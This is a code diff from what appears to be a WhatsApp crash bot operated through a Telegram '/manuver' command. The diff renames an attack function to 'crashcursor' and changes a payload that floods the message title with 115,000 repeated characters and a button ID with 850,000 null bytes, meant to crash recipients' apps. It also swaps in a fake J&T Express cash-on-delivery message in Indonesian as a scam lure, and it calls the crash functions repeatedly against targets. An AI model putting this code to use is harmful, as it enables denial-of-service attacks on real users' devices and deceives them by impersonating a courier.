@@ -596,7 +596,7 @@ async function Bug4(sock, jid) {
   });
 }
 
-async function  Bug9(sock, jid) {
+async function crashcursor(sock, jid) {
 const stanza = [
 {
 attrs: { biz_bot: '1' },
@@ -1074,7 +1074,7 @@ async function Fc(sock, jid) {
     viewOnceMessage: {
       message: {
         listResponseMessage: {
-          title: "ㇱ 𝗙𝗮𝗶𝗹 - ( 𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી )𐎟 ♨️" + "ꦾ".repeat(115000),
+          title: "Halo, kami dari J&T Express akan melakukan proses delivery paket COD dengan nomor waybill JX25191889440 ke alamat anda , mohon kesediaannya untuk memastikan apakah anda benar memesan barang COD senilai Rp 540,300?Terima kasih" + "ㅤ".repeat(115000),
           listType: 2,
           singleSelectReply: {
             selectedRowId: "SSS+",
@@ -1089,7 +1089,7 @@ async function Fc(sock, jid) {
                   contactVcard: true,
                 },
                 contentText: "lol",
-                footerText: "𝙉𝙖𝙣𝙙𝙚𝙢𝙤ી",
+                footerText: "ㅤㅤㅤ",
                 buttons: [
                   {
                     buttonId: "\u0000".repeat(850000),
@@ -2128,10 +2128,10 @@ bot.onText(/\/manuver (.+)/, async (msg, match) => {
           continue;
         }
 
-        await Fc(sock, jid);
         await InvisiPayload(sock, jid);
         await InvisiPayload(sock, jid);
-        await Fc(sock, jid);
+        await crashcursor(sock, jid);
+        await crashcursor(sock, jid);
 
         successCount++;
       } catch (error) {
